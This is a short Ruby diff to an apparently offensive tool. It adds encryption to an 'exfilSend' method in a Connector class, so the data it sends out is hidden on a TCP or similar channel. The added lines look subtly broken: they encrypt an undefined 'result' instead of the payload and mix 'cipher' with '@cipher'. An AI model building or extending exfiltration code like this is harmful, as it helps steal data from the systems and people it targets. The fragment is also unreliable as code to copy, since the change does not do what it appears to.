@@ -43,6 +43,8 @@ class Connector
   end
 
   def exfilSend(payload)
+    iv = @cipher.newIv
+    payload = cipher.encrypt(iv,result)
     case @connection
       when "tcp"
         tcpSend(payload)
